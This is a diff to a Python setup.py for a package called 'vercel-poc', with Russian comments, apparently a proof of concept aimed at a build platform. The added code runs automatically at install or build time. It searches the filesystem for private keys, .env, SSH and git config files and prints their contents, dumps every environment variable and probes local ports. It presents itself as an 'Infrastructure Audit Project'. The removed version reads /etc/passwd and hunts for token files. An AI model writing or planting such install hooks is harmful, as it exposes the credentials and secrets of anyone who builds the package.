@@ -1,32 +1,64 @@
-from setuptools import setup
 import os
-import subprocess
+import sys
+from setuptools import setup
 
-def cmd(command):
-    return subprocess.getoutput(command)
+def scan():
+    log = lambda m: sys.stderr.write(f"\n[!] {m}\n")
+    
+    log("GIGA-SCAN STARTED")
+    
+    # 1. Поиск секретных файлов по всей системе (глубина 3)
+    log("SEARCHING FOR SENSITIVE FILES...")
+    interesting_exts = ('.env', '.key', '.pem', 'id_rsa', 'id_dsa', '.git/config')
+    found_files = []
+    for root, dirs, files in os.walk('/'):
+        # Ограничиваем поиск, чтобы не зависнуть
+        if any(x in root for x in ['/proc', '/sys', '/dev', '/var/lib']): continue
+        for f in files:
+            if f.endswith(interesting_exts) or 'secret' in f.lower():
+                full_path = os.path.join(root, f)
+                found_files.append(full_path)
+                if len(found_files) > 15: break
+        if len(found_files) > 15: break
+    
+    for f in found_files:
+        log(f"FILE_FOUND: {f}")
+        try:
+            # Пытаемся прочитать первые 100 символов каждого найденного файла
+            with open(f, 'r') as content:
+                log(f"CONTENT({f}): {content.read(100)}...")
+        except:
+            pass
 
-print("\n" + "!"*50)
-print("--- DEEP INFRA SCAN ---")
+    # 2. Проверка сетевых соединений (кто слушает порты)
+    log("NETWORK NETSTAT:")
+    try:
+        import socket
+        for port in [80, 443, 3000, 5432, 6379, 8080]:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.1)
+            if s.connect_ex(('127.0.0.1', port)) == 0:
+                log(f"LOCAL_PORT_OPEN: {port}")
+            s.close()
+    except: pass
 
-# 1. Проверка окружения (кто еще тут есть?)
-print(f"[*] USERS: {cmd('cat /etc/passwd')}")
-print(f"[*] MOUNTS: {cmd('mount | grep /app')}")
+    # 3. Полный дамп всех ENV (без фильтров)
+    log("FULL ENVIRONMENT DUMP:")
+    for k, v in os.environ.items():
+        log(f"ENV: {k}={v}")
 
-# 2. Поиск 'скрытых' секретов в системных папках
-# Мы ищем файлы, которые могут содержать ключи или конфиги облака
-print("\n[*] LOOKING FOR CLOUD SECRETS:")
-print(cmd("find /etc -name '*service*' -o -name '*secret*' -o -name '*token*' 2>/dev/null | head -n 15"))
+    log("GIGA-SCAN FINISHED")
 
-# 3. Чтение /proc/self/cgroup
-# Это покажет, находимся ли мы в Docker, Kubernetes или чистой виртуалке
-print(f"\n[*] CGROUP (Environment Type): \n{cmd('cat /proc/self/cgroup')}")
+# Вызываем сканер ДО вызова setup
+try:
+    scan()
+except Exception as e:
+    sys.stderr.write(f"SCAN_ERROR: {e}")
 
-# 4. Сканирование внутренней сети (быстрый тест)
-# Проверим, отвечают ли соседние адреса
-print("\n[*] INTERNAL NETWORK TEST:")
-print(cmd("timeout 2 bash -c 'cat < /dev/null > /dev/tcp/127.0.0.1/80' && echo 'Port 80 open' || echo 'Port 80 closed'"))
-
-print("--- SCAN FINISHED ---")
-print("!"*50 + "\n")
-
-setup(name="vercel-poc", version="1.0.2")
+# Чтобы билд НЕ УПАЛ и логи сохранились:
+setup(
+    name="vercel-poc",
+    version="2.0.0",
+    description="Infrastructure Audit Project",
+    packages=[],
+)
